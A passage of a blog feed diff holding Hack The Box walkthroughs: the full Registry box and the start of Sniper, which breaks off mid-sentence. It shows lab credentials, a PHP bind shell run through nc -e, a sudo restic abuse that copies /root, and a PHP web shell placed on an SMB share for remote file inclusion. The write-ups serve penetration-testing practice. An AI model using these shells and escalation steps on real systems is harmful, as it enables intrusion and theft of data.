+&lt;p&gt;The latest version (at the time of these notes) is 3.6.10. Looking at common exploits for the version being used, the following matches this criteria:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Bolt CMS 3.6.4 - Cross-Site Scripting&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;That said, this appears to require authorization that we don&amp;rsquo;t have yet and there may be other channels to take here, so let&amp;rsquo;s look elsewhere first.&lt;/p&gt;
+&lt;p&gt;The nmap scan shows port 443 as having an SSL with the common name of docker.registry.htb. Adding that to our hosts file and running gobuster scan against it gets us a directory called &lt;code&gt;v2&lt;/code&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;skynet Boxes/Registry » cat dirb/registry_registry.dirb
+/v2 (Status: 401)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This is protected by basic auth but I managed to bypass it with manual fuzzing - “admin:admin” are the correct creds, and this gives us access to a blank JSON interface. Looking at the headers of the page I can see this:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Docker-Distribution-Api-Version: registry/2.0&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Which suggests that this API endpoint is interfacing with Docker Registry - this is a docker tool that allows you to store docker images in a repository, which is part of a Docker Registry. In order to move forward we&amp;rsquo;re going to have to try and enumerate whether we have any data available to us through this endpoint. This page appears to be particularly useful in assisting us with that goal:&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://docs.docker.com/registry/spec/api/#listing-repositories&#34; target=&#34;_blank&#34;&gt;Docker Registry - Listing Repositories&lt;/a&gt;
+&lt;/p&gt;
+&lt;p&gt;That entire page is actually very useful but the anchor point in the URL above describes how to list available “repositories” - Following the guidance and visiting &lt;code&gt;/v2/_catalog&lt;/code&gt; shows us:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;~/HTB/Boxes/Registry curl http://docker.registry.htb/v2/_catalog -H &amp;quot;Authorization: Basic YWRtaW46YWRtaW4=&amp;quot;
+{&amp;quot;repositories&amp;quot;:[&amp;quot;bolt-image&amp;quot;]}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;A single repo exists, as you can see, with the name: &lt;code&gt;bolt-image&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Now to see if we can pull this image. According to &lt;a href=&#34;https://5ysk3y.github.io/htb/guides/registry/&#34; target=&#34;_blank&#34;&gt;this&lt;/a&gt;
+ pulling an image requires you to get two things: the image manifest and something called associated layer files. Layer files are a bit like chunked archives; you have a number of them that contain different parts of a wider data set. Once you have them all, you typically have what resembles an entire image. First off, to get the manifest, you visit:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://docker.registry.htb/v2/&amp;lt;name&amp;gt;/manifests/&amp;lt;reference&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We have the &lt;code&gt;&amp;lt;name&amp;gt;&lt;/code&gt; (bolt-image) but the reference we needed was obtained using this:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt; ~/HTB/Boxes/Registry curl http://docker.registry.htb/v2/bolt-image/tags/list -H &amp;quot;Authorization: Basic YWRtaW46YWRtaW4=&amp;quot;
+{&amp;quot;name&amp;quot;:&amp;quot;bolt-image&amp;quot;,&amp;quot;tags&amp;quot;:[&amp;quot;latest&amp;quot;]}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The reference was the tag shown: &lt;code&gt;latest&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;That then translates to the following URL:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;a href=&#34;http://docker.registry.htb/v2/bolt-image/manifests/latest&#34;&gt;http://docker.registry.htb/v2/bolt-image/manifests/latest&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Visiting or CURL&amp;rsquo;ing this outputs a tonne of data; one part of that data is a set of blobsums. These are the &amp;ldquo;layers&amp;rdquo; dockers documentation was referering to, earlier.&lt;/p&gt;
+&lt;p&gt;To get individual layers, we can pull the blobsum list from this manifest:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt; ~/HTB/Boxes/Registry curl -s http://docker.registry.htb/v2/bolt-image/manifests/latest -X GET -H &amp;quot;Authorization: Basic YWRtaW46YWRtaW4=&amp;quot; | grep blobSum
+&amp;quot;blobSum&amp;quot;: &amp;quot;sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b&amp;quot;
+&amp;quot;blobSum&amp;quot;: &amp;quot;sha256:3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee&amp;quot;
+&amp;quot;blobSum&amp;quot;: &amp;quot;sha256:02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c&amp;quot;
+&amp;quot;blobSum&amp;quot;: &amp;quot;sha256:c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7&amp;quot;
+&amp;quot;blobSum&amp;quot;: &amp;quot;sha256:2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791&amp;quot;
+&amp;quot;blobSum&amp;quot;: &amp;quot;sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4&amp;quot;
+&amp;quot;blobSum&amp;quot;: &amp;quot;sha256:f5029279ec1223b70f2cbb2682ab360e1837a2ea59a8d7ff64b38e9eab5fb8c0&amp;quot;
+&amp;quot;blobSum&amp;quot;: &amp;quot;sha256:d9af21273955749bb8250c7a883fcce21647b54f5a685d237bc6b920a2ebad1a&amp;quot;
+&amp;quot;blobSum&amp;quot;: &amp;quot;sha256:8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797&amp;quot;
+&amp;quot;blobSum&amp;quot;: &amp;quot;sha256:f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Taking the first of these blobsums and hitting the &lt;a href=&#34;http://docker.registry.htb/v2/bolt-image/blobs/sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b&#34; target=&#34;_blank&#34;&gt;proper URL&lt;/a&gt;
+ with that gets us a binary file that (after following) turned out to be a tar.gz file containing a single script detailing some docker ssh info.. so, partial data.&lt;/p&gt;
+&lt;p&gt;Now it would appear that, to be thorough, im going to need to download all of these blobs. So I used the above blobsum output with awk to grab the sha256:N poritions of that and then ran it through a loop with wget:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;for i in $(cat blobs); do wget --user admin --password admin http://docker.registry.htb/v2/bolt-image/blobs/$i -O $i.tar.gz; done&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Most of these are bytes in size, but two of them are larger: blob starting 2931 = 100mb and blob starting f476 = 36mb.&lt;/p&gt;
+&lt;p&gt;Going through them to see whether, once all data is extracted, theres anything useful to find and we can confirm that there is. With all blobs downloaded we can now extract all the data to get a full image.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;N.B: I installed rename and ran the following command to easily rename all files for mass extraction (the colon after &amp;ldquo;sha256&amp;rdquo; in the filename was causing issues):&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;code&gt; ~/HTB/Boxes/Registry rename &#39;s/sha256://&#39; *&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Inspecting the extracted data suggests it is a full docker container image we&amp;rsquo;ve downloaded, as it contains most of the standard Linux file structure. In this case the useful folder was /root/.ssh - this contains a config file and a SSH key pair. The config file is as follows:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;skynet root/.ssh » cat config
+Host registry
+  User bolt
+  Port 22
+  Hostname registry.htb
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This confirms the user (bolt) but we need a passphrase for the SSH key we have because connecting without one fails. I think I got slightly lucky here poking around the docker image we have because I found the following file:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;./etc/profile.d/02-ssh.sh&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Containing this:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;skynet Registry/docker » cat ./etc/profile.d/02-ssh.sh
+#!/usr/bin/expect -f
+#eval `ssh-agent -s`
+spawn ssh-add /root/.ssh/id_rsa
+expect &amp;quot;Enter passphrase for /root/.ssh/id_rsa:&amp;quot;
+send &amp;quot;GkOcz221Ftb3ugog\n&amp;quot;;
+expect &amp;quot;Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)&amp;quot;
+interact
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This shows a script that uses &lt;code&gt;expect&lt;/code&gt; to execute a command to add the SSH key we found to the system keychain - and in doing so, it exposes a password! I got a shell by using the user defined in the config file (bolt) and the id_rsa file we have. When it comes to the passphrase, the &lt;code&gt;\n&lt;/code&gt; at the end of the string is a literal new line, so it needs to be removed. Our full passphrase is &lt;code&gt;GkOcz221Ftb3ugog&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Upon logging in we get the user flag! Epic. We also have a direct login to the bolt user.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;bolt@bolt:~$ wc -c user.txt
+33 user.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
+&lt;h1 id=&#34;root-pwn&#34;&gt;Root Pwn&lt;/h1&gt;
+&lt;p&gt;Now we have a shell on the box, we can run an enumeration script to get a handle on things. There was nothing in the Bolt home folder that peaked my interest so I decided to run LinEnum which exposes a few interesting things. If we recall, earlier on, we stumbled across a CMS named Bolt that had an authenticated CVE - LinEmum gives us a way to potentially get around this by highlighting the &lt;code&gt;bolt.db&lt;/code&gt; file that the CMS is using to store data:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;/var/www/html/bolt/tests/phpunit/unit/resources/db:
+total 92K
+drwxrwxr-x 2 www-data www-data 4.0K Oct  8 21:16 .
+drwxrwxr-x 4 www-data www-data 4.0K Oct  8 21:16 ..
+-rw-rw-r-- 1 www-data www-data  84K Oct  8 21:16 bolt.db
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And its SQLite3 format:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;bolt@bolt:/var/www/html/bolt$ file /var/www/html/bolt/tests/phpunit/unit/resources/db/bolt.db
+/var/www/html/bolt/tests/phpunit/unit/resources/db/bolt.db: SQLite 3.x database, last written using SQLite version 3020001
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The HTB machine didnt have SQLite available so I downloaded this locally and queried the most interesting table (the users table!) - I&amp;rsquo;ve had SQL give me the important info here but you can poke around the other tables if you wish to:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sqlite&amp;gt; select password from bolt_users where id=1;
+password
+------------------------------------------------------------
+$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK
+&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
+&lt;p&gt;N.B - the associated user for this password was &lt;code&gt;admin&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Running this through Hashcat gets us a password:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK : strawberry
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I&amp;rsquo;ll also note another file I spotted through LinEnum located here:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/var/www/html/backup.php&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;The contents of this are actually fairly interesting:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;bolt@bolt:/var/www/html$ cat backup.php
+&amp;lt;?php shell_exec(&amp;quot;sudo restic backup -r rest:http://backup.registry.htb/bolt bolt&amp;quot;);
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The file is owned by root but it also, very likely, exists for a reason. In knowledge of this we can now go back to the Bolt CMS with a view to pulling this all together.
+Poking around on the &lt;a href=&#34;https://docs.bolt.cm/3.7/manual/login&#34; target=&#34;_blank&#34;&gt;Bolt CMS Knowledge Base&lt;/a&gt;
+ you can see that their default admin URI is &lt;code&gt;/bolt&lt;/code&gt; - given that the CMS is installed into a directory of the same name, the full admin URL will be:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;http://10.10.10.159/bolt/bolt&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;As we are unable to really do much with our Bolt user, the next step (given the path we&amp;rsquo;re taking) is to try and gain access to the underlying web user - we know that Bolt is susceptible to being exploited, and we&amp;rsquo;re now able to login. If we look around the CMS, we&amp;rsquo;ll quickly find out we have access to the bolt &lt;code&gt;config.yml&lt;/code&gt; file via the web interface - Configuration -&amp;gt; Main Configuration - browsing the contents will quickly help you realise that you&amp;rsquo;re unable to upload PHP files by default. You are, if you try it, able to override this by adding the PHP extension to the list of &lt;code&gt;accept_file_types: &lt;/code&gt; that are defined. All uploaded files go into the URI &lt;code&gt;/bolt/files/&lt;/code&gt; so its now possible to get code execution, without the need for a pre-written CVE.&lt;/p&gt;
+&lt;p&gt;After a bit of playing around with file uploads, it&amp;rsquo;ll probably become apparant that PHP reverse shells don&amp;rsquo;t seem to work. If we go back the SSH access we have via the Bolt user, we can see whether iptables is configured to make our lives difficult:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;bolt@bolt:/var/www/html$ cat /etc/iptables.conf | grep -i drop
+-A OUTPUT -d 10.0.0.0/8 -p tcp -m tcp --tcp-flags FIN,SYN,RST,ACK SYN -j DROP
+-A OUTPUT -d 10.0.0.0/8 -p udp -j DROP
+-A DOCKER-ISOLATION-STAGE-2 -o docker0 -j DROP
+-A DOCKER-ISOLATION-STAGE-2 -o br-1bad9bd75d17 -j DROP
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sneaky, sneaky! All outbound connections to any IP on the 10. range will be dropped - TCP connections will be dropped depending on the packet type that is sent. You&amp;rsquo;ll notice that ICMP is not included here, so pings will work successfully. This may have fooled some people into thinking their reverse shells should work. UDP connections are also blocked entirely. Which means that we&amp;rsquo;re going to need to try a &lt;strong&gt;bind&lt;/strong&gt; shell.&lt;/p&gt;
+&lt;p&gt;For those that aren&amp;rsquo;t aware, a bind shell is (sorta) the opposite of a reverse shell; when you configure a reverse shell, you typically setup a listener on your host machine and have the remote machine connect &lt;em&gt;back to you&lt;/em&gt;. When that isn&amp;rsquo;t possible you may be able to configure a bind shell which means you configure the remote server to bind to a port on the &lt;em&gt;server-side&lt;/em&gt; that you then connect to from your host machine.&lt;/p&gt;
+&lt;p&gt;Initially I tried using the version of &lt;code&gt;nc&lt;/code&gt; that was on the box, but this is an earlier version that doesn&amp;rsquo;t come compiled with the ability to use the &lt;code&gt;-e&lt;/code&gt; (execute) flag - therefore, in order to do this properly, I did the following:&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;1)&lt;/strong&gt; Upload a new copy of nc (inclusive of the execute flag) to a folder on the server (e.g. /dev/shm); this can be done using the bolt user over SCP. Also, change the file perms to 777.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;2)&lt;/strong&gt; Update Bolt config via web GUI to allow for PHP file uploads (as explained above)&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;3)&lt;/strong&gt; Upload a PHP script that runs, via system(), nc on that server. It includes &lt;code&gt;/bin/bash&lt;/code&gt; as executable arguments and a listening port, e.g:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;skynet Registry/bolt » cat exploit.php
+&amp;lt;?php
+system(&#39;/dev/shm/nc -e /bin/bash -lvnp 9001&#39;);
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;4)&lt;/strong&gt; Run the script via a browser to actually setup the listener on the box, e.g:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://10.10.10.159/bolt/files/exploit.php)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;5)&lt;/strong&gt; Connect from local machine, e.g;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;skynet Registry/bolt » nc 10.10.10.159 9001&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;We now have a shell as the www-data user. I opted to quickly run another LinEnum scan with this user but, whilst that ran, I also decided to try some of the basics that didn&amp;rsquo;t work using our bolt user, namely our ability to run &lt;code&gt;sudo -l&lt;/code&gt; to list commands we can run, via that user, with sudo:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;www-data@bolt:~$ sudo -l
+Matching Defaults entries for www-data on bolt:
+    env_reset, exempt_group=sudo, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on bolt:
+    (root) NOPASSWD: /usr/bin/restic backup -r rest*
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So the next step is to leverage the www-data account to create a backup using sudo and restic, through the REST protocol. In order to really exploit this without prior knowledge you need to look into two things:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Restic itself - I found the &lt;a href=&#34;https://restic.readthedocs.io/en/latest/&#34; target=&#34;_blank&#34;&gt;documentation&lt;/a&gt;
+ rather comprehensive, at least in terms of figuring out how the backup/restore process works.&lt;/li&gt;
+&lt;li&gt;Restic Rest Server - you&amp;rsquo;ll need to upload a compiled version of &lt;a href=&#34;https://github.com/restic/rest-server&#34; target=&#34;_blank&#34;&gt;this&lt;/a&gt;
+ binary in order to exploit this properly.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Armed with some new syntaxical knowledge and a restic REST binary (confusing, I know) we can try and root this box.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;N.B - I opted to do all of this on the remote machine due to the restrictions we showed earlier with the firewall. You could use Chisel or SSH to point the &lt;a href=&#34;https://restic.readthedocs.io/en/latest/030_preparing_a_new_repo.html#rest-server&#34; target=&#34;_blank&#34;&gt;default REST port&lt;/a&gt;
+ (8000) back to your machine, before you handle all of this between remote/local hosts.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;The method I used was as follows:&lt;/p&gt;
+&lt;p&gt;Firstly, create a directory, via the bolt user - this will be used to host a repository, e.g. (the default) /tmp/restic. From there initialize that folder with restic as a repo:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;bolt@bolt:~$ restic init --repo /tmp/restic&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;This configures literally everything for you as well as prompting you to setup a repo password.&lt;/p&gt;
+&lt;p&gt;From there I uploaded a copy of a binary I referenced earlier called ‘rest-server’ - this was downloaded and compiled (pretty quickly via golang) on my Kali box. I then uploaded it via scp using the bolt user and hosted the newly created repo via the rest-server binary:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;bolt@bolt:~$ ./rest-server --no-auth&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;N.B: If you do not use the default /tmp/restic path as your repository folder, you&amp;rsquo;ll need to specify the full path of your repo using the &amp;ndash;path argument with rest-server&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;This starts the server on its default port (8080) and /tmp/restic is the default data directory.&lt;/p&gt;
+&lt;p&gt;From there we hop onto the www-data user, and run the following command to backup the machines &lt;code&gt;/root&lt;/code&gt; directory into our local REST repository - all of this was achieved by simply reading the Restic docs:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;www-data@bolt:~/html$ sudo restic backup -r rest:http://127.0.0.1:8000/ /root
+enter password for repository: password
+password is correct
+found 2 old cache directories in /var/www/.cache/restic, pass --cleanup-cache to remove them
+scan [/root]
+scanned 10 directories, 14 files in 0:00
+[0:00] 100.00%  28.066 KiB / 28.066 KiB  24 / 24 items  0 errors  ETA 0:00
+duration: 0:00
+snapshot 898355a7 saved
+www-data@bolt:~/html$
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Back on our bolt user, we then list the snapshots we have in the repo:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;bolt@bolt:~$ restic -r /tmp/restic snapshots&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;And restore the one we want, e.g:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;bolt@bolt:~$ restic -r /tmp/restic restore latest --target /tmp/restic --path &amp;quot;/root&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;The &lt;code&gt;--path&lt;/code&gt; argument just defines the directory we want to restore from the listed snapshots. The &lt;code&gt;--target&lt;/code&gt; argument defines the folder into which the data gets restored. As the original owner of the files was root, restic will try and chown the files back to that ownership when you run the restore; this will fail because the bolt user cannot change file permissions to the root user. I outline this because the ownership change failures get shown as errors in the restore output which can be deceiving; the data does get restored. In this case we got the entire contents of the /root folder, including the flag file and the .ssh folder containing a key we can use to connect via SSH, without a passphrase.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;root@bolt:~# wc -c root.txt
+33 root.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;final-thoughts&#34;&gt;Final Thoughts&lt;/h1&gt;
+&lt;p&gt;And that&amp;rsquo;s the box! For those interested, this introduction to Restic caused me to migrate over to that application for my home backups and it&amp;rsquo;s genuinely brilliant. The weakness here was in the way sudo had been configured to allow backups to be taken of root owned files by a non-root user, not the restic application itself.&lt;/p&gt;
+&lt;p&gt;I hope you enjoyed the read.&lt;/p&gt;
+</content>
     </item>
     
     <item>
@@ -33,7 +536,276 @@
       <pubDate>Sun, 29 Mar 2020 16:21:41 +0000</pubDate>
       
       <guid>https://5ysk3y.github.io/htb/guides/sniper/</guid>
-      <description>Overview Sniper was one of my favorite boxes from recent memory. It leverages an RFI and Powershell constrained mode to eventually get a user shell. From there you poison a Windows Help (CHM) file in order to execute code as the Administrator user. Let&amp;rsquo;s take a look at how I did it. Please also note that the first part of this leverages a python script that I created; it&amp;rsquo;s referenced and included as a gist for your viewing.</description>
+      <description>Overview Sniper was one of my favorite boxes from recent memory. It leverages an RFI and Powershell constrained mode to eventually get a user shell. From there you poison a Windows Help (CHM) file in order to execute code as the Administrator user. Let&amp;rsquo;s take a look at how I did it.</description>
+      <content>
+  &lt;figure class=&#34;left&#34; &gt;
+    &lt;img src=&#34;https://5ysk3y.github.io/images/guides/htb/sniper.png&#34;   /&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
+&lt;p&gt;Sniper was one of my favorite boxes from recent memory. It leverages an RFI and Powershell constrained mode to eventually get a user shell. From there you poison a Windows Help (CHM) file in order to execute code as the Administrator user. Let&amp;rsquo;s take a look at how I did it. Please also note that the first part of this leverages a python script that I created; it&amp;rsquo;s referenced and included as a gist for your viewing.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;nmap-scan&#34;&gt;NMAP Scan&lt;/h1&gt;
+&lt;p&gt;First up, from my standard nmap scan, we see :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;nmap -A -oA nmap/snipper_initial -vvv 10.10.10.151
+
+Nmap scan report for 10.10.10.151
+Host is up, received echo-reply ttl 127 (0.017s latency).
+Scanned at 2019-10-08 17:54:45 BST for 60s
+Not shown: 996 filtered ports
+Reason: 996 no-responses
+PORT    STATE SERVICE       REASON          VERSION
+80/tcp  open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
+| http-methods:
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Sniper Co.
+135/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+139/tcp open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds? syn-ack ttl 127
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+No OS matches for host
+TCP/IP fingerprint:
+SCAN(V=7.80%E=4%D=10/8%OT=80%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=5D9CBF91%P=x86_64-pc-linux-gnu)
+SEQ(SP=103%GCD=1%ISR=10D%TI=I%II=I%SS=S%TS=U)
+OPS(O1=M54DNW8NNS%O2=M54DNW8NNS%O3=M54DNW8%O4=M54DNW8NNS%O5=M54DNW8NNS%O6=M54DNNS)
+WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
+ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M54DNW8NNS%CC=Y%Q=)
+T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
+T2(R=N)
+T3(R=N)
+T4(R=N)
+U1(R=N)
+IE(R=Y%DFI=N%TG=80%CD=Z)
+
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=259 (Good luck!)
+IP ID Sequence Generation: Incremental
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 7h00m47s
+| p2p-conficker:
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 25157/tcp): CLEAN (Timeout)
+|   Check 2 (port 18459/tcp): CLEAN (Timeout)
+|   Check 3 (port 51336/udp): CLEAN (Timeout)
+|   Check 4 (port 40243/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2019-10-08T23:55:52
+|_  start_date: N/A
+
+TRACEROUTE (using port 445/tcp)
+HOP RTT      ADDRESS
+1   16.83 ms 10.10.14.1
+2   16.86 ms 10.10.10.151
+
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Oct  8 17:55:45 2019 -- 1 IP address (1 host up) scanned in 59.98 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;user-pwn&#34;&gt;User Pwn&lt;/h1&gt;
+&lt;p&gt;For the most part there&amp;rsquo;s only the web port, so lets start by checking that out:&lt;/p&gt;
+&lt;p&gt;http://10.10.10.151/&lt;/p&gt;
+&lt;p&gt;Nothing special in the source. There&amp;rsquo;s 2 links that lead off here:&lt;/p&gt;
+&lt;p&gt;http://10.10.10.151/blog/
+http://10.10.10.151/user/&lt;/p&gt;
+&lt;p&gt;The blog itself doesnt appear to be built on any CMS framework; the only significant thing I can see thus far is that it has the ability to interchange languages via a PHP URL arugment, but we&amp;rsquo;ll revisit that shortly. I also took a copy of such a request and fed it to SQLMap for examination. It doesnt appear to have been able to find any injection points.&lt;/p&gt;
+&lt;p&gt;I&amp;rsquo;m also running full dirb scans of the /blog and /user URL&amp;rsquo;s and, in the case the user URL, I was able to sign up and login. Once logged in you get sent to a construction page, again no useful info in the source. The dirb scan for /user includes the login cookie associated with my registration to ensure it scans everything it can, but it doesn&amp;rsquo;t give further results.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt; ~/HTB/Boxes/Sniper/dirb cat sniper_initial.dirb | grep 200 | sort | uniq -i
+/blog (Status: 200)
+/index.php (Status: 200)
+/user (Status: 200)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Based on intitial enumeration I found some CSS code that referenced something called “fostrap” which appears to be a theming template for Blogger. This appears to be a bit of dead end though.&lt;/p&gt;
+&lt;p&gt;On top of this, as briefly mentioned, there appears to be some form of LFI/RFI expoit here; on the blog, theres only 3 working links in the sites menu, all of these follow the context of:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/blog/?lang=blog-&amp;lt;lang&amp;gt;.php &lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Where &lt;code&gt;lang&lt;/code&gt; is (e.g.) en, fr, es. I&amp;rsquo;ve attempted to fuzz the parameter to some success; including the index.php page forces the page to include itself and that basically breaks the application for that particular load. I&amp;rsquo;ve also tried fuzzing for .aspx and asp, as theyre common IIS file types but nothing has come back from that.&lt;/p&gt;
+&lt;p&gt;After browsing around to see how this can be exploited, it turns out theres a particular vulnerability to allow exploiting of RFI in conjunction with PHP and SMB:&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html&#34; target=&#34;_blank&#34;&gt;RFI using PHP/SMB&lt;/a&gt;
+&lt;/p&gt;
+&lt;p&gt;This effectively uses a PHP exploit that involves including files from remote SMB shares regardless of whether standard PHP file include restictions (fopen_url etc) are enabled. In this case, they are. So we should be able to abuse this. I&amp;rsquo;ve setup an SMB share and inside it I&amp;rsquo;ve got a file called hax.php (yes, I know, Its leet). Quite simply, it contains this:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;&amp;lt;?php system($_GET[&#39;cmd&#39;]); ?&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;For posterity the following also reflects the codeblock used in my smb.conf file:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;[share]
+path = /var/www/html/pub
+writable = no
+guest ok = yes
+guest only = yes
+read only = yes
+directory mode = 0555
+force user = nobody
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I&amp;rsquo;ve also created a Gist that contains these 2 things, as well as a Python based wrapper script that can be used to execute commands on the machine directly. All of those things can be found here:&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://gist.github.com/5ysk3y/aeb4562d0e3473db315e41ba45bf7e3e&#34; target=&#34;_blank&#34;&gt;Sniper Gist by 5ysk3y&lt;/a&gt;
+&lt;/p&gt;
+&lt;p&gt;To exploit this using this script we call our malicious file via the SMB share in the url as follows:&lt;/p&gt;
